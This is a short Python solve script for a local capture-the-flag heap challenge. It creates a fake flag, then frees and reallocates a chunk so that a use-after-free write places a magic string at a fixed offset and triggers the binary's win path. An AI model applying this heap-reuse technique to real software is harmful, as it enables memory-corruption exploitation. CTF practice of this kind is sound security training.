#!/usr/bin/env python3
import subprocess
import os

os.chdir('/workspaces/ctf/heap_dyl_jumia')

# Create flag.txt if it doesn't exist  
with open('flag.txt', 'w') as f:
    f.write('DeepSec{fake_flag_for_local_test}\n')

# Exploit strategy:
# 1. Choose option 2 (Obliterate) to free allocated_space
# 2. Choose option 1 (Reserve space) with size 0x26 to get the same chunk
# 3. Input payload that overwrites allocated_space+30 with "w3th4nds"
# 4. Choose option 3 (Escape/road_to_salvation) to trigger the check

# Payload: 30 bytes filler + "w3th4nds"
payload = b'A' * 30 + b'w3th4nds'

# Build input sequence
input_data = b'2\n'  # Obliterate
input_data += b'1\n'  # Reserve space
input_data += b'38\n'  # Size 0x26 = 38 bytes
input_data += payload + b'\n'
input_data += b'3\n'  # Road to salvation

# Run the exploit
p = subprocess.run(['./heap_jumia'], input=input_data, capture_output=True, timeout=5)
output = p.stdout.decode(errors='ignore')
print(output)

if 'DeepSec{' in output:
    print('\n[+] FLAG FOUND!')
else:
    print('\n[-] No flag yet')
    print('STDERR:', p.stderr.decode(errors='ignore'))
